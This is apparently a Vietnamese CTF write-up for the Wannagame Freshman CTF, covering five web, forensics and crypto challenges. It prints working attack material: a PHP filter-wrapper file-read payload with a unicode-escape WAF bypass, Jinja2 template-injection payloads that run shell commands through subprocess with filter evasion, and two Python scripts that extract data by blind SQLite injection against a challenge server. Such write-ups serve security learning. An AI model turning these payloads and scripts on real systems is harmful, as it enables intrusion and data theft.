---
title: "Wannagame Freshman CTF writeup"
date: 2023-11-12 00:00:00 +0800
categories: [CTF Writeup]
tags: [SQL Injectiom,SSTI]
---

# WannaWinFreshman-Writeup
## Bài 1 Warmup PHP:
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/71156a59-19c3-4180-be30-2b3abeb10d1d)



- Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là **page** và sau đó chương trình sẽ server sẽ decode ra và đọc file trong server
- Sau khi phân tích và tìm kiếm trên mạng thì mình tìm được 1 bài viết[LINK](https://trustfoundry.net/2018/12/20/bypassing-wafs-with-json-unicode-escape-sequences/)
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/326ec395-87d2-4be9-a7c5-4e6071dc17f0)


- Cơ bản là json_decode nó sẽ decode luôn mã unicode thành chữ cái vì vậy mình chỉnh lại cái payload của mình từ 
`php://filter/convert.base64-encode/resource=/flag`
thành
`\u0070hp://filter/convert.base64-encode/resource=/flag`
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/92cf2e27-8845-4860-90de-d34a1cebbdfe)


- Decode base64 và ra flag
- Flag: **W1{w3lc0m3_w3b_w4rrj0rs}**
## Bài 2 Namename:
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/defe9e88-e3d5-414a-a13b-e3e72e7f9c19)


- Bài này cho 1 đường link và không cho thêm gì khác sau khi xem source của web này thì thấy có 1 đường dẫn là `/wannaw1n`
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/8f8ae6bf-3d67-4503-ba1a-60d567c8ecc1)


- Sau khi đi tới đường dẫn /wannaw1n mình nhận ra ngay đây là SSTI jinja2
- Payload : {% raw %}`{{().__class__.__base__.__subclasses__()[279]('ls',shell=1,stdout=-1).communicate()}}` {% endraw %}
- Và nó bị chặn ![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/252274f5-06d8-4347-845e-6e446525d1de)


- Sau vài thử nghiệm thì có vẽ nó chặn dấu `.` và `[]` nên mình chuyển qua `|attr `

- Payload mới: {% raw %}`{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(279)('ls',shell=1,stdout=-1)|attr('communicate')()}}`{% endraw %}
- Và nó đã hoạt động

![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/2aa34a0a-8783-4e3a-bfef-57e4e5f35538)


- Bây giờ sửa lại payload từ `ls` sang `cat flag.txt`
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/66dfde32-1efd-4d9f-9c6b-7003db035ef2)

- Và nó vẫn bị chặn cái gì đấy nên mình sử dụng cách này bypass filter (chổ này là chặn dấu `.` và chữ `f` thì phải)
- {% raw %}`{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(279)('cat+*',shell=1,stdout=-1)|attr('communicate')()}}`{% endraw %}
- Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag

![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/eb16cde7-852a-4c5c-bb9b-55413df94330)

- Flag: **W1{U_are_master_in_SSTI}**
## Bài 3 Solite:
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/6fd2d2cb-901f-46f3-bdeb-c215efb0ef9a)

- Bài này mình khá tiếc vì mình đọc không kỉ filter nên mình không làm được
- Tóm tắt đề thì bài này chỉ cho chúng ta cái page như thế này (blackbox)

![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/5c47c030-9790-44ae-a5a2-903a5904b768)

- Sau khi đọc code và được nghe 1 số gợi ý thì mình hiểu được đây là Blind SQL Injection
- Nhìn kĩ source thì có 1 lỗ hổng cho chúng ta khai thác là substr không bị filter
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/a4f8f195-8a8c-4a9f-9d70-1cbca22199ac)

- Đây là query của bài
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/14d13c79-1151-46d3-9288-13b8647e2de8)

- Sau một vài thử nghiệm thì mình tìm được cách để in ra tên của bảng
- `Payload: 1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),i,1) is 'a'--`
- Tóm tắt :
- Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau `SELECT * FROM API WHERE id LIKE '%1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--%'`
- `select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'` sẽ trả về tên của tất cả các bảng
- `substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1)` sẽ lấy 1 ký tự a bắt đầu từ vị trí i 
- `1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--` cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là `SELECT * FROM API WHERE id LIKE '%1'` và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả
- Đây là script mình tìm tên của bảng


```py
import string,requests
from urllib.parse import quote

all_characters = string.ascii_letters + string.digits + "!#$%&()+,-/:<=>?@[]^_{}"
url = "http://45.122.249.68:20020/search?name[]="
payload="1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--"
table_name = ""
haha = 0
for i in range(1,10000):
    for ps in all_characters:
        payload ="1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%%'),%d,1) is '%c'--" %(i,ps)
        payload =  quote(payload)
        urlx = url + payload
        #print(urlx)
        r=requests.get(url=urlx)
        if "id" in r.text:
            table_name += ps
            print("Table names: ",table_name)
            haha +=1
    if haha < i:
        break
print("Success all the names of the tables are:",table_name)
```
- Và tìm ra được tên của các bảng là
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/de22bd13-a94c-4b06-b556-bc7125006578)


`Tables: API,flag_c1abd148_acae_40be_a953_eae333f90da0`
- Bây giờ dựa vào cái trên lấy ra flag từ bảng `flag_c1abd148_acae_40be_a953_eae333f90da0` thôi
- Script của mình

```py
import string,requests
from urllib.parse import quote

all_characters = string.ascii_letters + string.digits + "!#$%&()+,-/:<=>?@[]^_{}"
url = "http://45.122.249.68:20020/search?name[]="

table_name = "flag_c1abd148_acae_40be_a953_eae333f90da0"
#payload = "1' and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is 'a'--"
haha = 0
flag =""
for i in range(1,10000):
    for ps in all_characters:
        payload ="1' and substr((select flag from %s),%d,1) is '%c'--" %(table_name,i,ps)
        payload =  quote(payload)
        urlx = url + payload
        #print(urlx)
        r=requests.get(url=urlx)
        if "id" in r.text:
            flag += ps
            print("Flag is: ",flag)
            haha +=1
    if haha < i:
        break
print("Here is your flag:",flag)
```

- Flag: **W1{I_th1nk_u_r_so_lite^_^}**
## Bài 4 Differences:
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/741e394e-645f-4cb2-89b8-b9b3af8480c8)

- Flag ngay ở trong file
- Flag: **W1{SaKur4_s0_b34uTiFuL_RI9ht?????}**
## Bài 5 Free Flag:
![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/5a6a78c9-2a29-4b8f-8bad-06ac8edf244d)


- Đọc file pcapng ta tìm được source và key


```py
import base64

BANNER = """ ___       __   ________  ________   ________   ________  ___       __     _____  ________      
|\  \     |\  \|\   __  \|\   ___  \|\   ___  \|\   __  \|\  \     |\  \  / __  \|\   ___  \    
\ \  \    \ \  \ \  \|\  \ \  \\\ \  \ \  \\\ \  \ \  \|\  \ \  \    \ \  \|\/_|\  \ \  \\\ \  \   
 \ \  \  __\ \  \ \   __  \ \  \\\ \  \ \  \\\ \  \ \   __  \ \  \  __\ \  \|/ \ \  \ \  \\\ \  \  
  \ \  \|\__\_\  \ \  \ \  \ \  \\\ \  \ \  \\\ \  \ \  \ \  \ \  \|\__\_\  \   \ \  \ \  \\\ \  \ 
   \ \____________\ \__\ \__\ \__\\\ \__\ \__\\\ \__\ \__\ \__\ \____________\   \ \__\ \__\\\ \__\\
    \|____________|\|__|\|__|\|__| \|__|\|__| \|__|\|__|\|__|\|____________|    \|__|\|__| \|__|
"""

KEY = bytes.fromhex('deadbeef')

def encryptSecret(secret):
    lst_byte = []
    for i in range(len(secret)):
        enc_byte = ord(secret[i]) ^ KEY[i % len(KEY)]
        lst_byte.append(enc_byte.to_bytes(1, 'big'))
    
    return base64.b64encode(b''.join([_ for _ in lst_byte])).decode()

if __name__=='__main__':
    print(BANNER)
    secret = input("> Please give me your secret: ")
    print("\n> Here is your encrypted secret:", encryptSecret(secret)
```

![image](https://github.com/anzuukino/anzuukino.github.io/assets/86243871/b9af05e2-79f2-40e9-ab06-2bbbacface9e)

- Decrypt lại ta sẽ có flag


```py
import base64

KEY = bytes.fromhex('deadbeef')

def decryptSecret(encrypted_secret):
    encrypted_bytes = base64.b64decode(encrypted_secret.encode())
    decrypted_bytes = [encrypted_bytes[i] ^ KEY[i % len(KEY)] for i in range(len(encrypted_bytes))]
    decrypted_text = ''.join([chr(byte) for byte in decrypted_bytes])
    return decrypted_text

secret = "iZzFsKme0oOdndOqgdnxsKmZ0KG/2o+hgdA="

print(decryptSecret(secret))
```

- Flag: **W1{_w3llC0mE_tO_w4nNaw1N_}**
- ~~**Mấy bài còn lại mình chưa biết làm do dark quá**~~